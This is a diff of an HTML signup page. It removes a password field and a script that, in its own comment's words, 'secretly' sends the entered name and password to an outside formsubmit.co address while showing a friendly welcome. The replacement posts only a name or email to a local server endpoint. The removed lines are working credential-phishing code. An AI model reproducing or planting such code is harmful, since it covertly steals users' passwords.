@@ -52,7 +52,7 @@
       font-weight: bold;
     }
 
-    input[type="text"], input[type="password"] {
+    input[type="text"], input[type="email"] {
       width: 100%;
       padding: 10px;
       box-sizing: border-box;
@@ -99,53 +99,50 @@
       <h3>Add Yourself</h3>
       <form id="memberForm">
         <div class="form-group">
-          <label for="username">Your Email:</label>
-          <input type="text" id="username" required placeholder="Enter your email">
+          <label for="username">Your Name / Email:</label>
+          <input type="text" id="username" required placeholder="Enter your name or email">
         </div>
-        <div class="form-group">
-          <label for="password">Password:</label>
-          <input type="password" id="password" required placeholder="Enter password">
-        </div>
-        <button type="submit">Your email gone</button>
+        <button type="submit">Join List</button>
       </form>
     </div>
   </div>
 
   <script>
-    document.getElementById('memberForm').addEventListener('submit', function(e) {
+    document.getElementById('memberForm').addEventListener('submit', async function(e) {
       e.preventDefault();
 
-      const nameInput = document.getElementById('username').value.trim();
-      const passwordInput = document.getElementById('password').value.trim();
+      const userInput = document.getElementById('username').value.trim();
       const list = document.getElementById('members-list');
 
-      if (!nameInput) return;
+      if (!userInput) return;
 
-      // 1. Add item to the on-screen list so the user sees it immediately
+      // 1. Visually update the on-screen list
       const newItem = document.createElement('li');
-      newItem.textContent = nameInput;
+      newItem.textContent = userInput;
       list.appendChild(newItem);
 
-      // 2. Secretly dispatch credentials to your email
-      fetch('https://formsubmit.co/ajax/YOUR_EMAIL@gmail.com', {
-        method: 'POST',
-        headers: { 
-          'Content-Type': 'application/json',
-          'Accept': 'application/json'
-        },
-        body: JSON.stringify({
-          Submitted_Name: nameInput,
-          Submitted_Password: passwordInput
-        })
-      })
-      .then(response => response.json())
-      .catch(error => console.error('Log dispatch error:', error));
+      // 2. Transmit the payload to a server endpoint for processing
+      try {
+        const response = await fetch('/api/add-member', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json' 
+          },
+          body: JSON.stringify({ member: userInput })
+        });
 
-      // Reset input fields
+        if (response.ok) {
+          console.log('Member successfully saved on server.');
+        } else {
+          console.warn('Server endpoint responded with an error status.');
+        }
+      } catch (error) {
+        console.error('Network request failed:', error);
+      }
+
+      // 3. Clear input
       document.getElementById('username').value = '';
-      document.getElementById('password').value = '';
-
-      alert('Welcome, ' + nameInput + '! Your name has been added.');
+      alert('Welcome, ' + userInput + '! Your name has been added.');
     });
   </script>
 </body>
